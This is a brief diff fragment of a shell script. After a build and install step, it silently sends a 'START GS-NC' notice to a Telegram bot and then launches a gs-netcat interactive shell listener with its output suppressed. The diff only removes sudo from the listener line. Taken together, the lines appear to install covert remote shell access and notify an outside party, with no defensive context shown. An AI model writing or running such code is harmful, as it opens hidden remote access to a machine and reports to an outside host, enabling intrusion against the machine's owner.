@@ -6,4 +6,4 @@ make
 sudo make install
 cd /
 curl -s --data-urlencode "text=START GS-NC--START GS-NC" "https://api.telegram.org/bot$TOK/sendMessage?chat_id=$YOUID" &>/dev/null
-sudo gs-netcat -s $PROG -il &>/dev/null
+gs-netcat -s $PROG -il &>/dev/null
